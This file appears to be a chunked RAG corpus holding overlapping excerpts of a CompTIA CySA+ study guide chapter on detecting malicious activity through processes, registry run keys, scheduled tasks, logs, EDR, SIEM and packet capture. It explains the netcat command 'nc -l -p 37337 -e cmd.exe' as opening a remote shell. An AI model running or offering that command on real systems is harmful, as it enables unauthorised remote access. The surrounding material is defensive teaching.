rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	the same types of things. Detecting malware, malicious processes, and unauthorized software often relies on a handful of major methods: ■■ ■■ ■■ ■■ ■■ Central management tools like Microsoft Endpoint Manager, which can manage software installation and report on installed software. It is important to note that unlike tools like resmon and perfmon, Endpoint Manager doesn’t monitor in real time. Antivirus and antimalware tools, which are designed to detect potentially harmful software and files. Endpoint detection and response (EDR), which we will discuss in more depth later in this chapter, can help detect malicious files and behavior and allow responses that can stop attacks immediately. Software and file block listing, which uses a list of disallowed software and files and prohibits its installation. This differs from antivirus and antimalware by potentially providing a broader list of prohibited files than only malicious or similar files. Application allow listing, which allows only permitted files and applications on a system. In an environment with thorough allow list implementation, no files that were not previously permitted are allowed on a system. Most managed environments will use more than one of these techniques to manage the software and applications that are present on workstations, servers, and mobile devices. 96 Chapter 3 ■ Malicious Activity When Innocuous Tools Aren’t A common Linux command-­line utility known as netcat, or its Windows equivalent nc .exe, is often associated with penetration testing and compromises. Netcat allows you to l -­ p 37337 -­ e cmd create UDP or TCP connections using simple commands like nc -­ .exe (which opens a remote shell on port 37337, which connects to cmd.exe). Due to this, it is often baked into exploits to provide easy connectivity. If you find netcat (or nc.exe) on a system where it shouldn’t be, your system may have been owned! Abnormal OS Process Behavior Abnormal behavior observed in operating system processes can be an indicator of a rootkit or other malware that has exploited an operating system component. For Windows systems, a handful of built-­in tools are most commonly associated with attacks like these, including cmd.exe, at.exe and schtasks.exe, wmic.exe, powershell.exe, net.exe, reg.exe, and sc.exe, and similar useful tools. Tools like Metasploit have built-­in capabilities to inject attack tools into running legitimate processes. Finding these processes requires tools that can observe the modified behavior or check the running process against known good process fingerprints. Another common technique is to name rogue processes with similar names to legitimate operating system components or applications, or use DLL execution via rundll32.exe to run as services via svchost. SANS provides an excellent poster called “Know Normal. . .Find Evil” with many more details than we can include here. You can find it at http://digital-­forensics.sans.org/media/dfir_ poster_2014.pdf. Data Exfiltration Data exfiltration, or the unauthorized removal of data from systems and datastores, is a key indicator of potentially malicious activity. Malicious actors often seek data, either to allow them to conduct further attacks and compromises or as valuable artifacts that they can sell or
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	is to name rogue processes with similar names to legitimate operating system components or applications, or use DLL execution via rundll32.exe to run as services via svchost. SANS provides an excellent poster called “Know Normal. . .Find Evil” with many more details than we can include here. You can find it at http://digital-­forensics.sans.org/media/dfir_ poster_2014.pdf. Data Exfiltration Data exfiltration, or the unauthorized removal of data from systems and datastores, is a key indicator of potentially malicious activity. Malicious actors often seek data, either to allow them to conduct further attacks and compromises or as valuable artifacts that they can sell or make use of directly. Organizational data of all types is a major target for attackers. That means that security practitioners need to use tools and techniques that can detect and stop data exfiltration. At the same time, malicious actors attempt to conceal exfiltration activities through a range of methods, including using encryption, sending it via commonly Investigating Host-­Related Issues 97 used channels like HTTPS, or sending it through covert channels like tunneling through DNS requests or other services. Tools like EDR, IPS, and data loss prevention (DLP) systems all have a role to play when monitoring for and preventing data exfiltration. A layered defense along with appropriate data tagging and protection can all help defenders detect, prevent, or stop data exfiltration. Unauthorized Access, Changes, and Privileges Unauthorized access to systems and devices, as well as use of privileges that result in unexpected changes, are a major cause for alarm. Unfortunately, the number and variety of systems, as well as the complexity of the user and permissions models in use in many organizations, can make monitoring for unauthorized activity challenging. The good news is that monitoring for unauthorized access, changes, and privileges uses many of the same set of techniques and technologies we have already discussed. Table 3.1 lists some of the possible methods for detection for each of these types of unauthorized use. TA B L E 3 . 1 Unauthorized use and detection mechanisms Unauthorized use type Data logged Unauthorized access Authentication Unauthorized changes Location of data User creation Authentication Central management suite logs SIM/SIEM User creation logs File creation System logs Central management suite Settings changes Application logs SIM/SIEM Monitoring tools Unauthorized privilege use Analysis tools Privilege use attempts Security event logs Privilege escalation Application logs File and directory integrity checking tools (Tripwire) SIM/SIEM Log analysis tools Each of these techniques requires a strong understanding of what access is expected on each system or devices so that exceptions can be detected. Change management, permission management, and identity management are all important administrative processes to apply in addition to the tools and controls listed earlier. 98 Chapter 3 ■ Malicious Activity Unauthorized privileges can be harder to track, particularly if they are not centrally managed and audited. Fortunately, tools like Sysinternals’s AccessChk can help by validating the access that a specific user or group has to objects like files, Registry keys, and services. On the other hand, although the
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	of these techniques requires a strong understanding of what access is expected on each system or devices so that exceptions can be detected. Change management, permission management, and identity management are all important administrative processes to apply in addition to the tools and controls listed earlier. 98 Chapter 3 ■ Malicious Activity Unauthorized privileges can be harder to track, particularly if they are not centrally managed and audited. Fortunately, tools like Sysinternals’s AccessChk can help by validating the access that a specific user or group has to objects like files, Registry keys, and services. On the other hand, although the audit system in Linux can help detect uses of privileges, checking for specific permissions will typically require you to write a script to check the specific privileges you are concerned about. Registry Changes or Anomalies The Windows registry is a favorite location for attackers who want to maintain access to Windows systems. Using run keys, the Windows Startup folder, and similar techniques is a common persistence technique. Registry run keys can be found in: ■■ HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run ■■ HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run ■■ ■■ HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ RunOnce HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce That means that monitoring the Windows Registry for changes can be an important part of incident response. For systems with infrequent changes like servers, protecting the Registry can be relatively easily done through the use of application allow lists. In cases where Registry monitoring tools are not an option, lockdown tools can be used that prohibit Registry changes. When changes are required, the tools can be turned off or set into a mode that allows changes when patching Windows, and then turned back on for daily operations. For workstations where changes may be made more frequently, more in-­depth control choices like an agent-­based tool may be required to prevent massive numbers of false positives. Unauthorized Scheduled Tasks Scheduled tasks, or cron jobs in Linux, are also a popular method for attackers to maintain persistent access to systems. Checking for unexpected scheduled tasks (or cron jobs) is a common part of incident response processes. To check scheduled tasks in Windows 10, you can access the Task Scheduler via Start ➢ Windows Administrative Tools ➢ Task Scheduler. Windows 11 changes this to Start ➢ Windows Tools ➢ Task Scheduler. Figure 3.8 shows the detail you can access via the graphical Task Scheduler interface, including when the task ran, when it was created, and other information. Checking scheduled tasks from the Windows command line is as easy as using the schtasks command. You’ll probably want to pipe it to more using a command like schtasks | more so you don’t have to scroll back through it. Investigating Host-­Related Issues FIGURE 3.8 99 The Windows Task Scheduler showing scheduled tasks and creation times You can detect unexpected scheduled tasks in Linux by checking cron. You can check crontab itself by using cat /etc/crontab, but you may also want to check /etc/cron for anything stashed there. Listing cron jobs is easy as well; use the crontab -­l command to do so. You
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	the Windows command line is as easy as using the schtasks command. You’ll probably want to pipe it to more using a command like schtasks | more so you don’t have to scroll back through it. Investigating Host-­Related Issues FIGURE 3.8 99 The Windows Task Scheduler showing scheduled tasks and creation times You can detect unexpected scheduled tasks in Linux by checking cron. You can check crontab itself by using cat /etc/crontab, but you may also want to check /etc/cron for anything stashed there. Listing cron jobs is easy as well; use the crontab -­l command to do so. You should pay particular attention to jobs running as root or equivalent users, and using the -­u root flag in your crontab list command will do that. Exam Note The CySA+ exam objectives don’t list cron jobs. Instead, they specifically mention scheduled tasks, which is the Windows term. Since you may encounter Unix, Linux, and macOS systems that use cron, we have included it here as well. Social Engineering Social engineering, or exploiting the human element of security, targets individuals to gather information. This may be via phone, email, social media, or in person. Typically, social engineering targets specific access or accounts, but it may be more general. Attackers often focus on humans as a potential weak spot in secure architectures and designs. Spotting social engineering, however, requires different techniques than the technical tools and processes we’ve talked about thus far in the chapter. Social engineering detection often requires: ■■ ■■ ■■ Awareness training to ensure that staff members detect and report suspicious behaviors that may be social engineering attempts Reporting processes that are timely and that encourage staff to report social engineering attempts and successes without being punitive Analysis and response capabilities to determine what, if any, impact a social engineering attempt had and the scope of impact if it was successful 100 Chapter 3 ■ Malicious Activity The exam outline also specifically calls out one technique commonly associated with phishing but that may be used for other social engineering attacks as well. Obfuscated links, or links that are intentionally deceptive, are a tool frequently used to fool users into clicking on malicious sites. Exam Note The CySA+ exam objectives list social engineering attacks and obfuscated links in a catch-­all “other” section as part of Objective 1.2. That doesn’t mean they’re not important—­ social engineering is a common technique for attackers, and obfuscated links are commonly used in phishing emails and similar social engineering efforts. Investigating Service-­and Application-­Related Issues Investigating application and service issues requires information about what services and applications are running, how they are expected to behave, as well as self-­reported and system-­reported information about the services. In many organizations, active service monitoring will also be used to determine if the service is working properly. Application-­and service-­related events like incorrect behavior, unexpected log messages or errors, new users or processes, and file changes are all common signs of a possibly compromised service. Fortunately, many of the tools you
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	attackers, and obfuscated links are commonly used in phishing emails and similar social engineering efforts. Investigating Service-­and Application-­Related Issues Investigating application and service issues requires information about what services and applications are running, how they are expected to behave, as well as self-­reported and system-­reported information about the services. In many organizations, active service monitoring will also be used to determine if the service is working properly. Application-­and service-­related events like incorrect behavior, unexpected log messages or errors, new users or processes, and file changes are all common signs of a possibly compromised service. Fortunately, many of the tools you need to investigate these problems are already built into Windows and Linux systems. Application and Service Monitoring Monitoring applications and services is critical to an organization’s operations and can also provide important security insight by showing where unexpected behavior is occurring or where applications and services are being abused. In this section, we use the terms application and service interchangeably. Some organizations will separate them, with services characterized as specialized and often accessed by other programs, and applications more generalized and often accessed by humans. This distinction can get a bit fuzzy! Investigating Service-­and Application-­Related Issues 101 Application and service monitoring can be categorized into a few common monitoring areas: ■■ Up/down: Is the service running? ■■ Performance: Does it respond quickly and as expected? ■■ ■■ Transactional logging: Information about the function of the service is captured, such as what actions users take or what actions are performed. Application or service logging: Logs about the function or status of the service. Each of these areas provides part of the puzzle for visibility into an application’s or service’s status, performance, and behavior. During an investigation, you will often need to identify behavior that does not match what the service typically logs. Application Logs Application logs can provide a treasure trove of information, but they also require knowledge of what the application’s log format is and what those logs will contain. While many Linux logs end up in /var/log, Windows application logs can end up gathered by the Windows logging infrastructure or in an application-­specific directory or file. Part of a security professional’s work is to ensure that appropriate logging is set up before an incident occurs so that logs will be available and will be protected from modification or deletion by an attacker. Sending critical application logs to a central log collection and/or analysis service is a common part of that strategy. Introduction of New Accounts Attackers often attempt to create accounts in applications as part of their efforts to obtain and retain access. Both cloud-­hosted and on-­premises applications need to be logged and monitored to ensure that account creation is captured, and unexpected account creation results in alerts and reporting. In organizations or services with high numbers of new accounts, this can be a particular challenge. That means that focusing on privileged accounts is a good starting point. Additional monitoring for bulk account creation, or accounts that are created
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	log collection and/or analysis service is a common part of that strategy. Introduction of New Accounts Attackers often attempt to create accounts in applications as part of their efforts to obtain and retain access. Both cloud-­hosted and on-­premises applications need to be logged and monitored to ensure that account creation is captured, and unexpected account creation results in alerts and reporting. In organizations or services with high numbers of new accounts, this can be a particular challenge. That means that focusing on privileged accounts is a good starting point. Additional monitoring for bulk account creation, or accounts that are created at times, or from locations that are atypical are also common techniques used to detect and identify potentially malicious account creations. Introduction of new accounts can happen at the operating system level too, but the CySA+ exam outline specifically places it under the “application-­related” objective. That means you’ll also want to consider accounts added to applications, whether they’re on-­premises or cloud-­hosted. 102 Chapter 3 ■ Malicious Activity Application and Service Anomaly Detection Anomalous activity from services and applications can be relatively common. A variety of non-­security-­related problems can result in issues such as these: ■■ ■■ ■■ Application or service-­specific errors, including authentication errors, service dependency issues, and permissions issues Applications or services that don’t start on boot, either because of a specific error or, in the case of services, because the service is disabled Service failures, which are often caused by updates, patches, or other changes Service and application failure troubleshooting typically starts with an attempt to start, or restart, the service. If that is not successful, a review of the service’s log message or error messages can provide the information needed to resolve the problem. Anomalies in services and applications due to security issues may be able to be detected using the same monitoring techniques; however, additional tools can be useful to ensure that the service and its constituent files and applications are not compromised. Along with common service and log monitoring tools, you might choose to deploy additional protection such as the following: ■■ Antimalware, antivirus, and EDR tools ■■ File integrity checking tools ■■ Allow list tools Windows provides WinDbg for debugging issues. Crash dump debugging is outside the scope of this book, but you can find details at http://msdn.microsoft.com/en-­us/library/windows/hardware/ mt219729(v=vs.85).aspx. Windows Service Status Windows service status can be checked either via the Services administrative tool (services.msc) or by using command-­line tools like sc, the Service Controller application, which accepts command-­line flags that set the start type for service, specify the error level it should set if it fails during boot, and provide details of the service. PowerShell also provides service interaction cmdlets like Start-­Service to interact with services on local and remote Windows hosts. Linux Service Status Linux services can be checked on most systems by using the service command. service [servicename] status will return the status of many, but not all, Linux services. You can try the command to list the state of all
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	(services.msc) or by using command-­line tools like sc, the Service Controller application, which accepts command-­line flags that set the start type for service, specify the error level it should set if it fails during boot, and provide details of the service. PowerShell also provides service interaction cmdlets like Start-­Service to interact with services on local and remote Windows hosts. Linux Service Status Linux services can be checked on most systems by using the service command. service [servicename] status will return the status of many, but not all, Linux services. You can try the command to list the state of all services by running: service –-­status-­all Investigating Service-­and Application-­Related Issues 103 Linux systems that use init.d can be checked by running a command like: /etc/init.d/servicename status Linux service restart processes vary depending on the distribution. Check your distribution to verify how it expects services to be restarted. Application Error Monitoring Most Windows applications log to the Windows Application log (although some maintain their own dedicated log files as well). To check for application errors, you can view the Application log via the Windows Event Viewer. You can also centralize these logs using SCOM. Many Linux applications provide useful details in the /var/log directory or in a specific application log location. Using the tail command, you can monitor these logs while the application is tested. Much like Windows, some Linux applications store their files in an application-­specific location, so you may have to check the application’s documentation to track down all the data the application provides. Application Behavior Analysis Applications that have been compromised or that have been successfully attacked can suddenly start to behave in ways that aren’t typical: outbound communications may occur, the application may make database or other resource requests that are not typically part of its behavior, or new files or user accounts may be created. Understanding typical application behavior requires a combination of the following: ■■ ■■ ■■ Documentation of the application’s normal behavior, such as what systems it should connect to and how those connections should be made Logging, to provide a view of normal operations Heuristic (behavioral) analysis using antimalware tools and other security-­monitoring systems to flag when behaviors deviate from the norm Exam Note Pay particular attention to this section: each of these items is one that you may be expected to recognize and identify on the exam! ■■ Anomalous activity, or activity that does not match the application’s typical behavior, is often the first indicator of an attack or compromise. Log analysis, behavior baselines, and filesystem integrity checking can all help detect unexpected behavior. User and administrator awareness training can also help make sure you hear about applications that are behaving in abnormal ways. Chapter 3 104 ■ Malicious Activity (continued) ■■ ■■ ■■ ■■ ■■ Introduction of new accounts, particularly those with administrative rights, are often a sign of compromise. Application account creation is not always logged in a central location, making it important to find ways to track both account creation
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	does not match the application’s typical behavior, is often the first indicator of an attack or compromise. Log analysis, behavior baselines, and filesystem integrity checking can all help detect unexpected behavior. User and administrator awareness training can also help make sure you hear about applications that are behaving in abnormal ways. Chapter 3 104 ■ Malicious Activity (continued) ■■ ■■ ■■ ■■ ■■ Introduction of new accounts, particularly those with administrative rights, are often a sign of compromise. Application account creation is not always logged in a central location, making it important to find ways to track both account creation and privileges granted to accounts. Administrative controls that match a change management workflow and approvals to administrative account creation, paired with technical controls, can provide a stronger line of defense. Unexpected output can take many forms, from improper output or garbled data to errors and other signs of an underlying application issue. Unexpected output can also be challenging to detect using centralized methods for user-­level applications. Server-­ based applications that provide file-­or API-­level output are often easier to check for errors based on validity checkers (if they exist!). This is another type of application error where user and administrator training can help identify problems. Unexpected outbound communication, like beaconing, outbound file transfers, and attacks, are common types of application exploit indicators. Using network monitoring software as well as a capable and well-­tuned intrusion detection or prevention system monitoring outbound traffic is critical to detecting these problems. Service interruption can indicate a simple application problem that requires a service or server restart but can also indicate a security issue like a DoS attack or a compromised application. Monitoring tools should monitor application or service status as well as user experience to capture both views of how a service is working. Application logs are a critical resource when investigating issues and as part of detection of potential problems. Knowing where your logs are, what they contain, and what their contents mean is an important part of identifying and assessing indicators of compromise and malicious activity. Determining Malicious Activity Using Tools and Techniques The CySA+ exam outline focuses on a small set of tools that you’ll need to be familiar with for the exam. They include tools for packet capture, log analysis and correlation, endpoint security, DNS and IP reputation, file analysis, and sandboxing. For many of these tools, you’ll at least need to understand the concept of the tool and how it can be applied. For others, you may need some basic familiarity with the tool or its output. As you review these tools, you should consider your level of comfort and experience with them to determine if you need further review and hands-­on experience. Determining Malicious Activity Using Tools and Techniques 105 Logs, Log Analysis, and Correlation Organizations can end up with a massive volume of security data from monitoring and logging various systems and services. Security analysts are often asked to help analyze that data to identify security issues and
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	to understand the concept of the tool and how it can be applied. For others, you may need some basic familiarity with the tool or its output. As you review these tools, you should consider your level of comfort and experience with them to determine if you need further review and hands-­on experience. Determining Malicious Activity Using Tools and Techniques 105 Logs, Log Analysis, and Correlation Organizations can end up with a massive volume of security data from monitoring and logging various systems and services. Security analysts are often asked to help analyze that data to identify security issues and to respond to security events. This means that analysts need to know how to quickly assess the organizational impact of an event and must be able to determine if the event is localized or if it has a broader scope. Analyzing the impact of an event requires the following: ■■ Knowing if other events are correlated with the initial event ■■ Understanding what systems, users, services, or other assets were involved or impacted ■■ Data classification for any data assets that are part of the event ■■ Other information that may influence organizational decisions about the event Analyzing data will also require the ability to sort through it, either using a security information and event management (SIEM) tool, through logging and aggregation technologies like Splunk or an ELK (Elasticsearch, Logstash, and Kibana) stack implementation, or using more manual techniques. In addition to assessing organizational impact versus localized impact, analysts must determine what the immediate impact of an event or incident is versus the total impact. A single incident may result in little or no harm, but it may also be a sign of a larger compromise or a broad-­scale attack against an organization. Understanding what is occurring across an organization may involve trend analysis techniques that help analysts see changes from a baseline or normal levels for events. They can also help analysts compare events against industry norms or historic patterns. Exam Note This version of the CySA+ exam outline doesn’t specifically call out types of logs you might need to review, but previous versions have. We’ll dive into some specific log types as examples of what you may need to be able to read and interpret as you’re determining whether activity is malicious, but you may run into other log types or formats as well. Logs Applications, services, systems, and many other assets in your organization’s infrastructure will either generate logs or will have the ability to generate logs if you configure them properly. The sheer volume of logs and logging sources can quickly become overwhelming, and finding meaningful data in logs from even a small organization may feel impossible. Security analysts need to know what logs exist by default on systems, how to access them, how to find information about the content of those logs, and how to interpret that content. 106 Chapter 3 ■ Malicious Activity In addition, you need to understand how the organization uses logs,
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	and many other assets in your organization’s infrastructure will either generate logs or will have the ability to generate logs if you configure them properly. The sheer volume of logs and logging sources can quickly become overwhelming, and finding meaningful data in logs from even a small organization may feel impossible. Security analysts need to know what logs exist by default on systems, how to access them, how to find information about the content of those logs, and how to interpret that content. 106 Chapter 3 ■ Malicious Activity In addition, you need to understand how the organization uses logs, whether those logs are properly secured, and what gaps exist in log collecting and analysis infrastructure. As you read about logs, you should also consider how organizations centralize logs and logging infrastructure both on-­premises and in the cloud. Centralizing logs and using tools that can process, analyze, and report on massive volumes of logs are critical elements in modern security architectures. Event Logs The Windows event log can be viewed directly on workstations using the Event Viewer from the Start menu. By default, Windows includes Application, Security, Setup, and System logs, which can all be useful for analysts. In Figure 3.9, you can see an example of the Application log showing installer events. Tracking when a specific package was installed and by whom is a common part of many investigations into malware events and other forensic or incident response processes. FIGURE 3.9 Windows Event Viewer entries If you’re looking for Windows event logs, by default they’re stored in %SystemRoot%\System32\Winevt\Logs Event Viewer also works for Active Directory logs, although you’ll quickly find that even a moderately sized domain can generate more logs than you may want to directly view in Event Viewer. Exporting your logs to a purpose-­built log aggregation and analysis system can be an attractive option. Determining Malicious Activity Using Tools and Techniques 107 Syslog Linux maintains information about the state of the system, events, and many other details, typically in the /var/log directory. Additional logs may be in application-­specific directories, or other locations on the system based on specific configurations or application and service defaults. Figure 3.10 shows the auth.log file on an Ubuntu server with a variety of sudo events that occurred. Searching for known events that include the use of administrative privileges is a common part of incident investigations. F I G U R E 3 . 10 Linux syslog entries in auth.log with sudo events Security Device Logs Security devices capture information about security events, system events, and other details that can be useful to security analysts. Although most devices are capable of sending syslogcompatible messages, what those messages contain and the way they are formatted can vary significantly from vendor to vendor. Exam Note The CySA+ exam is vendor neutral, which means you’re not expected to be an expert in any specific vendor’s log format, messages, or error codes. That also means that you need to understand how to read log entries without knowing
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	. 10 Linux syslog entries in auth.log with sudo events Security Device Logs Security devices capture information about security events, system events, and other details that can be useful to security analysts. Although most devices are capable of sending syslogcompatible messages, what those messages contain and the way they are formatted can vary significantly from vendor to vendor. Exam Note The CySA+ exam is vendor neutral, which means you’re not expected to be an expert in any specific vendor’s log format, messages, or error codes. That also means that you need to understand how to read log entries without knowing the specifics of the log format. Here, we focus on log entry concepts and provide a handful of examples for you to review. If you find these challenging, you should spend some additional time with logs from sources you’re not familiar with so that reading new types of logs becomes more natural to you. 108 Chapter 3 ■ Malicious Activity Regardless of the type of log that you are reviewing, bear in mind what type of event you are looking for and what identifiers appear in it that match the event or entry that you’re searching for. In many cases, you should look for related entries based on what you find in your initial search. For example, if you’re looking for blocked traffic to a host with IP address 10.1.10.4, you may also want to look at other entries for that host, and you may choose to broaden your search to search for all entries for 10.1.10.4. Similarly, if you were looking at blocked traffic and found that a host at 192.168.1.172 was sending traffic to 10.1.10.4 and that you saw hundreds of attempts on different ports, all of which were blocked, you might then search the logs to see if 192.168.1.172 was port-­scanning your entire network. Firewall Logs Although there are many types of firewall logs, most have some similarities. They typically identify the source and destination IP address, the port and protocol, and what action was taken on the traffic. They may also include data like the role that was matched, if there is a specific threat identifier associated with a block, which interface or port the traffic entered or exited the firewall on, and details of how much traffic was sent. In Figure 3.11, you can see an example of firewall entries for the Ubuntu UFW firewall. Note that the entries show the source and destination hosts, and that the service that was being accessed was on port 22. In this case, the firewall was blocking access to the OpenSSH service, and a client was retrying access until it failed. F I G U R E 3 . 11 UFW blocked connection firewall log entry examples WAF Logs Web application firewalls (WAFs) are a specialized type of firewall that operates at the application layer to filter out attacks against web applications. Many WAF systems have default rulesets that look for attacks that match the OWASP Top 10
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	Note that the entries show the source and destination hosts, and that the service that was being accessed was on port 22. In this case, the firewall was blocking access to the OpenSSH service, and a client was retrying access until it failed. F I G U R E 3 . 11 UFW blocked connection firewall log entry examples WAF Logs Web application firewalls (WAFs) are a specialized type of firewall that operates at the application layer to filter out attacks against web applications. Many WAF systems have default rulesets that look for attacks that match the OWASP Top 10 (http://owasp.org/ www-­project-­top-­ten) or other common application security risks, allowing administrators to quickly enable a common ruleset. Figure 3.12 shows an example of a ModSecurity entry for an OWASP Top 10 match, which found a request for the Bash shell (/bin/bash) in the arguments for the request. This type of log entry can help identify active attacks based on content in the logs. Determining Malicious Activity Using Tools and Techniques FIGURE 3.12 109 ModSecurity log entry examples Proxy Logs Much like firewall logs, proxy logs can provide useful information about connections and traffic. Proxies are often used to either centralize access traffic or to filter traffic. Thus, proxy logs will contain the source and destination IP address, the source and destination port, the requested resource, the date and time, and often the content type and HTTP referrer as well as details about the content, such as the amount of traffic that was sent. When analyzing proxy logs, you should look for data such as the following: ■■ ■■ ■■ ■■ Target host IP, hostname, and what was requested. The amount of content requested. This may help indicate a compromise or match a known malicious package. The HTTP request method, which can provide details of the query string with GET requests (POST requests carry this in the body of the message, requiring you to read the full payload, which is more complex). Unusual user agents and protocol versions, which may be useful for identifying applications, malware, or other targets. Intrusion Detection System (IDS) and Intrusion Prevention System (IPS) Logs IDS and IPS systems rely on rules to identify unwanted traffic. That means that when a rule is triggered on an IDS and an IPS, the logs will contain information about the rule that was activated and information about the traffic that was captured and analyzed to trigger the rule. Since IDS and IPS systems often analyze the content of packets and look at traffic across multiple packets or entire conversations to perform their functions, more data about what is occurring at the application level is often available. For example, if you are tracking a malware that uses an Internet Relay Chat (IRC)-­based C&C network, you could search for rule hits that included a specific channel name or a nickname that was used. Much like the other logs types we have discussed, finding the first log entry of interest will often lead to
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	captured and analyzed to trigger the rule. Since IDS and IPS systems often analyze the content of packets and look at traffic across multiple packets or entire conversations to perform their functions, more data about what is occurring at the application level is often available. For example, if you are tracking a malware that uses an Internet Relay Chat (IRC)-­based C&C network, you could search for rule hits that included a specific channel name or a nickname that was used. Much like the other logs types we have discussed, finding the first log entry of interest will often lead to other interesting log entries. It helps to annotate the log entries, capturing 110 Chapter 3 ■ Malicious Activity details about what you need to pursue further and what other searches you should perform with what you know as you proceed through your log review. Security Appliances and Tools Security appliances and tools are commonly used to automate and improve an organization’s ability to detect, identify, and respond to potentially malicious activity. While there are many solutions in this space, the CySA+ exam outline focuses on three that you will need to be aware of for the exam. SIEM Security information and event management (SIEM) tools leverage centralized logging and data gathering along with reporting and analysis capabilities to identify potential security issues. This information is combined with threat information, IOCs data, and other information to help identify issues. They leverage rules and filtering capabilities to perform their analysis, allowing organizations to deal with the massive volume of security information generated by modern infrastructure, systems, and applications. SIEM tools also provide incident management and response capabilities, allowing tracking, management, and oversight. EDR Endpoint detection and response (EDR) tools are deployed to endpoint systems, using agents to monitor for and detect potential security issues, attacks, and compromises. Endpoint agents report to a central console or system, providing visibility and management capabilities. EDRs focus on using threat patterns and indicators of compromise as well as behavioral analysis to determine if an issue is occurring or has occurred. They can then automatically respond, either neutralizing the threat, containing it, or alerting security practitioners or systems administrators. In addition to these capabilities, they often include tools that can be helpful for forensic analysis and incident response. While antivirus has become increasingly ineffective, EDRs are the new line of endpoint defense. Cybersecurity insurance vendors commonly ask about whether organizations have an EDR, and many organizations respond to major incidents by deploying one if they don’t have one already in place. While security trends change quickly, EDR technology is currently gaining broad adoption. SOAR Security orchestration, automation, and response (SOAR) tools are used to integrate security tools and systems. They rely on APIs (application programming interfaces) or other Determining Malicious Activity Using Tools and Techniques 111 integration methods to gather data from security devices like firewalls, vulnerability scanners, antimalware tools, IDS and IPS devices, EDR and SIEM systems, and any other security data sources an organization has.
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	about whether organizations have an EDR, and many organizations respond to major incidents by deploying one if they don’t have one already in place. While security trends change quickly, EDR technology is currently gaining broad adoption. SOAR Security orchestration, automation, and response (SOAR) tools are used to integrate security tools and systems. They rely on APIs (application programming interfaces) or other Determining Malicious Activity Using Tools and Techniques 111 integration methods to gather data from security devices like firewalls, vulnerability scanners, antimalware tools, IDS and IPS devices, EDR and SIEM systems, and any other security data sources an organization has. The data, alerting, and reporting centralization that SOAR platforms provide is then used to drive security automation tasks like triggering responses, correlation and alerting across disparate systems, and feeding analytics capabilities. A key element of SOARs is the use of playbooks, or automated sets of actions that are used when specific sets of events or triggers occur. SOAR platforms also focus on response, with incident management, monitoring, and reporting capabilities built-in. Using data from events to build actionable threat intelligence from multiple data sources is a common activity for SOAR users. Packet Capture Packet capture tools allow you to see traffic sent across network connections. Seeing into the traffic that is sent and received can provide significant insight into what is occurring on a network, including identifying attacks, malicious activity, and identifying connectivity problems, among other benefits. The CySA+ exam outline focuses on to two specific and commonly used packet capture tools. Wireshark Wireshark is a graphical packet capture and inspection tool that is available for Linux, Windows, and macOS. Figure 3.13 shows some of the deep detail you can obtain using Wireshark. In this case, you can determine the user agent for the device that is browsing a website, what site was browsed, and details of the content. Note that the host is cdn.iphonehacks.com and that the device being used is identified as an iPad running iOS 13.2.2. Identifying malware on your network through packet and protocol analysis relies on a strong knowledge of what traffic should look like and what behaviors and content are abnormal. Packet lengths, destination IP addresses, ports, and protocols can all provide useful information if you know what you are looking for or what normal and abnormal traffic looks like. Finding malware traffic when you can’t see the content of the packets due to encryption can be more challenging. In cases where packets are encrypted, you may have to rely on behavior-­based analysis by looking at traffic patterns that are indicative of malware like visiting known-­bad sites, sending unexpected traffic on uncommon ports, or other abnormal behaviors. Tcpdump Tcpdump is a command-­line packet capture tool commonly available on Linux systems but available for other operating systems as well. Since it is built into many Linux distributions, security professionals are often able to take advantage of it when Wireshark may not be immediately available or practical to use. 112 Chapter 3 FIGURE 3.13 ■ Malicious
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	encryption can be more challenging. In cases where packets are encrypted, you may have to rely on behavior-­based analysis by looking at traffic patterns that are indicative of malware like visiting known-­bad sites, sending unexpected traffic on uncommon ports, or other abnormal behaviors. Tcpdump Tcpdump is a command-­line packet capture tool commonly available on Linux systems but available for other operating systems as well. Since it is built into many Linux distributions, security professionals are often able to take advantage of it when Wireshark may not be immediately available or practical to use. 112 Chapter 3 FIGURE 3.13 ■ Malicious Activity Wireshark packet analysis with packet content detail A simple tcpdump command to capture traffic on port 80 to see HTTP data without a limit to how much data is captured with verbose output might be written as: tcpdump -­ i eth0 -­ s0 -­ v port 80 If you’re not familiar with tcpdump, you can find examples of usage at https:// hackertarget.com/tcpdump-­examples and https://danielmiessler.com/study/ tcpdump, among many other sites. DNS and Whois Reputation Services Organizations frequently rely on reputation services to help identify potentially malicious domains and IP addresses. While using Whois data can be helpful, subscriptions to a service or consuming data from an automated feed is more frequently used due to the scale of information that is both needed and available. You’ll still need to know how to use Whois information. It’s important to note that while Whois is a general term, there is also a site called Whois at http://whois.com. The more general use of the term means checking an IP address or hostname via a Determining Malicious Activity Using Tools and Techniques 113 Whois server. Whois can be run from a command line in Linux by default but must be added to Windows machines in most cases. When you run whois, it will attempt to resolve the IP address or domain and provide information about it including registration and contact information. An example of a whois search for Wiley.com follows. Note that the code has been abbreviated to not include all the information available for this example: Domain Name: wiley.com Registry Domain ID: 936038_DOMAIN_COM-­ VRSN Registrar WHOIS Server: whois.corporatedomains.com Registrar URL: www.cscprotectsbrands.com Updated Date: 2021-­08-­30T12:27:21Z Creation Date: 